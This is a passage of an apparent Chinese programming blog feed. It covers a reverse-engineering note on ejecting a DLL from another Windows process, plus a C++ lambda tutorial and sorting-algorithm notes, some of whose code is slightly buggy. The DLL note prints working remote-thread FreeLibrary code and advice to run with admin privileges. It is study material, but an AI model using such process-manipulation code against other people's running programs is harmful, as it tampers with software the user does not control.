          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 语言学习 </category>
          
          <category> 网络编程 </category>
          
          <category> CPP </category>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> 网络 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn peda from six.moves import range报错修复</title>
      <link href="/posts/4aa563d5.html"/>
      <url>/posts/4aa563d5.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://windeskybb.work/archives/16df477d-d5a8-4ea5-b5f9-d3b0bde9af07">kali系统安装gdb及其插件Peda|pwndbg|gef | 小风风のblog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 实践 </tag>
            
            <tag> 记录 </tag>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》08-DLL卸载</title>
      <link href="/posts/382e9cc4.html"/>
      <url>/posts/382e9cc4.html</url>
      
        <content type="html"><![CDATA[<p>这一篇拖了比较久，因为之前不理解进程的权限令牌的作用，看逆向工程核心原理的时候发现注入不需要权限但是卸载却需要，书里面还没详细说，就一直搁置了，前几周学了APC注入，才知道进程权限完全就是试的，如果遇到0x5访问权限冲突，那就提升权限就好了。</p><p>给予vs编译的exe默认请求admin权限</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目-属性-链接器-清单文件-uac执行级别-requireAdministrator</span><br></pre></td></tr></table></figure><h2 id="DLL卸载">DLL卸载</h2><p>DLL之前注入后，再次注入就不会触发attch效果了，如果不想重开进程就需要先卸载之后再注入。另一方面，如果想要让DLL执行完之后就立即卸载（即时效果）也许要卸载它。</p><h3 id="流程">流程</h3><p>找到进程-&gt;找进程模块-&gt;匹配相同的模块名-&gt;执行FreeLibrary</p><p>看书的时候发现FreeLibrary没有W且需要传入对应的句柄而不是指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">Injector::isLoaded</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hModule = <span class="literal">nullptr</span>;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, pid);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;创建快照失败&quot;</span>);</span><br><span class="line">MODULEENTRY32 me;</span><br><span class="line">me.dwSize = <span class="built_in">sizeof</span>(MODULEENTRY32);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hSnapshot, &amp;me)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_wcsicmp(<span class="built_in">PathFindFileNameW</span>(DLLpath), me.szModule) &amp;&amp;</span><br><span class="line">!_wcsicmp(DLLpath, me.szExePath)) &#123;</span><br><span class="line">hModule = me.hModule;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hSnapshot, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::eject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> pfreelibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">ModuleFuncLoader</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;FreeLibrary&quot;</span>).<span class="built_in">func</span>();</span><br><span class="line">std::string findMode;</span><br><span class="line">std::cin &gt;&gt; findMode;</span><br><span class="line"><span class="built_in">toLowerCase</span>(findMode);</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;pid&quot;</span>) &#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;name&quot;</span>) &#123;</span><br><span class="line">std::wstring name;</span><br><span class="line">std::wcin &gt;&gt; name;</span><br><span class="line">LPCWSTR lname = name.<span class="built_in">c_str</span>();</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(lname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;模式匹配失败&quot;</span>);</span><br><span class="line"></span><br><span class="line">DWORD pid = <span class="built_in">GetProcessId</span>(hProcess);</span><br><span class="line">HANDLE hModule = <span class="built_in">isLoaded</span>(pid);</span><br><span class="line"><span class="keyword">if</span> (hModule == INVALID_HANDLE_VALUE || hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;目标进程 &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot; 没有该模块&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pfreelibrary, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;远程线程创建失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP-lambda表达式</title>
      <link href="/posts/10c328b5.html"/>
      <url>/posts/10c328b5.html</url>
      
        <content type="html"><![CDATA[<h1>Lambda表达式</h1><h2 id="用处">用处</h2><p>在面向对象中用表达式声明和定义一个函数，使其可以捕获上层函数的变量，实现闭包。或是定义只能在某个函数中使用的匿名函数</p><h2 id="语法">语法</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list] (parameter list) [mutable/<span class="keyword">exception</span>/attribute] -&gt; <span class="keyword">return</span> <span class="keyword">type</span> <span class="type">&#123; </span><span class="keyword">function</span> <span class="title">body</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>capture list：捕获列表<ul><li>值捕获，定义时直接传值</li><li>引用捕获，内部使用的是对应变量的引用</li><li>隐式捕获，捕获所有外部变量，=表示值捕获，&amp;表示引用捕获</li><li>初始化捕获，捕获列表中可以定义变量，且可以自动auto</li></ul></li><li>parameter list：传入参数列表，同普通的函数</li><li>[mutable/exception/attribute]：不加mutable会自动给按值捕获的变量加const</li><li>type：返回类型，省略后自动推导</li><li>function body：函数体</li></ul><h2 id="举例">举例</h2><p>自定义排序算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(arr,[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;<span class="keyword">return</span> a&gt;b;&#125;);</span><br></pre></td></tr></table></figure><p>auto泛型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> f = [] (<span class="keyword">auto</span> x) -&gt; <span class="keyword">auto</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_integral&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (is_floating_point&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>捕获类中的成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> func = [*<span class="keyword">this</span>]()&#123;<span class="keyword">return</span> <span class="number">2</span>*num;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_60134435/article/details/136151698">深入浅出 C++ Lambda表达式：语法、特点和应用_c++ lamda 参数-CSDN博客</a></p><p>Lambda表达式虽然是一种语法糖，但它本质上也是一种函数对象，也就是重载了 <code>operator()</code> 的类的对象。每一个 Lambda表达式都对应一个唯一的匿名类，这个类的名称由编译器自动生成，因此我们无法直接获取或使用。Lambda表达式的捕获列表实际上是匿名类的数据成员，Lambda表达式的参数列表和返回值类型实际上是匿名类的 <code>operator()</code> 的参数列表和返回值类型，Lambda表达式的函数体实际上是匿名类的 <code>operator()</code> 的函数体。例如，下面的 Lambda表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [x] (<span class="type">int</span> y) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><p>相当于定义了一个匿名类，类似于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">__lambda_1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    __lambda_1(<span class="type">int</span> x) : __x(x) &#123;&#125; <span class="comment">// 构造函数，用于初始化捕获的变量</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> y)</span> <span class="type">const</span> <span class="comment">// 重载的 operator()，用于调用 Lambda表达式</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x + y; <span class="comment">// 函数体，与 Lambda表达式的函数体相同</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x; <span class="comment">// 数据成员，用于存储捕获的变量</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> f = __lambda_1(x); <span class="comment">// 创建一个匿名类的对象，相当于 Lambda表达式</span></span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure><p>由于 Lambda表达式是一种函数对象，因此它可以赋值给一个合适的函数指针或函数引用，也可以作为模板参数传递给一个泛型函数或类。</p><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/150554945">现代 C++：Lambda 表达式 - 知乎</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 语言学习 </category>
          
          <category> CPP </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> 闭包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本排序算法</title>
      <link href="/posts/981a96f7.html"/>
      <url>/posts/981a96f7.html</url>
      
        <content type="html"><![CDATA[<h1>插入排序</h1><p>插入排序是指每次排序的元素插入到已排序的列表中，和洗扑克牌一样。对于顺序表，插入所花时间很多。</p><h2 id="直接插入排序">直接插入排序</h2><p>从左到右选择元素插入到已排序列表，插入时保证使已排序列表依然有序。初始已排序列表为空</p><p>基本算法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">insertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (j != <span class="number">0</span> &amp;&amp; arr[j - <span class="number">1</span>] &gt; tmp) &#123;<span class="comment">//找到该插入的位置，并同时后一一位</span></span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;<span class="comment">//插入</span></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Container&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">insertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; i++) &#123;</span><br><span class="line"><span class="keyword">auto</span> key = *i;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j != first &amp;&amp; (*std::<span class="built_in">prev</span>(j) &gt; key)) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">*j = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00060332</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">6</span>.<span class="number">03324770</span></span><br></pre></td></tr></table></figure><p>直接插入排序有两个循环，所以一般情况下时间复杂度是$O(n)*O(n)=O(n^2)$，最坏的情况是完全逆序，与平均相同，最好情况为顺序，内循环不需要比较，所以时间复杂度为$O(n)$<br>对于空间复杂度，需要额外空间存放一个元素，所以是$O(1)$</p><h2 id="二分插入排序">二分插入排序</h2><p>也叫折半插入排序，直接插入排序使用了顺序查找，效率较低，所以把顺序查找换成二分查找能提高内循环效率，然而还是插入，感觉没有提高多少效率</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> mid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &lt; tmp) &#123;</span><br><span class="line">low = mid + <span class="number">1</span>;<span class="comment">//防止len=2时卡死？</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &gt; tmp) &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] == tmp) &#123;</span><br><span class="line">high = low = mid;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt; low; --j)<span class="comment">//只移动</span></span><br><span class="line">&#123;</span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr[low] = tmp;<span class="comment">//插入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; ++i) &#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = first;</span><br><span class="line"><span class="keyword">auto</span> mid = first;</span><br><span class="line"><span class="keyword">auto</span> tmp = *i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = low;</span><br><span class="line">std::<span class="built_in">advance</span>(mid, std::<span class="built_in">distance</span>(low, high) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (*mid &lt; tmp) &#123;</span><br><span class="line">low = std::<span class="built_in">next</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> j = i; j &gt; low; --j) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">&#125;</span><br><span class="line">*low = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00054250</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">5</span>.<span class="number">42496460</span></span><br></pre></td></tr></table></figure><p>我多试了几次(20长度)，发现比直接插入的速度慢，难道是我写错了？QAQ，可能是算法太菜了。</p><p>外循环$O(n)$，内循环查找+插入$O(log_2n)+O(n)$，所以总体时间复杂度：$O(nlog_2n)+O(n^2)=O(n^2)$，对于最好时间，已排序完成，$O(n)$，最差时间，倒序$O(n^2)$</p><p>这么一看在n小时用直接插入，n大时用二分插入更好。<br>对于空间复杂度，由于有4个额外空间，所以是$O(4)$</p><h2 id="希尔排序">希尔排序</h2><p>又叫缩小增量排序。直接插入排序有两个性质，在快排序好时，效率高，大概能到O(n)，但是插入操作十分低效因为每次都只能移动一位。所以希尔排序先划分小块分别插入排序，然后再总体插入排序。</p><p>那么选取H，即间隔就很重要了，这里有两篇文章</p><p><a href="https://oi-wiki.org/basic/shell-sort/">希尔排序 - OI Wiki</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F#.E6.AD.A5.E9.95.BF.E5.BA.8F.E5.88.97">希尔排序 - 维基百科，自由的百科全书</a></p><p>都提到了比较好的H选择，因为Sedgewick步长有点不好写，这里直接就用原作者的排序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt; gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, <span class="keyword">auto</span> function)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">function</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [](<span class="type">int</span> arr[], <span class="type">int</span> gap, <span class="type">const</span> <span class="type">int</span> len) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];<span class="comment">//防止j=i时arr[i]被修改</span></span><br><span class="line"><span class="keyword">while</span> (j - gap &gt; <span class="number">0</span> &amp;&amp; arr[j - gap] &gt; tmp) &#123;</span><br><span class="line">arr[j] = arr[j - gap];</span><br><span class="line">j -= gap;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="built_in">return</span> (<span class="type">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g, len);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 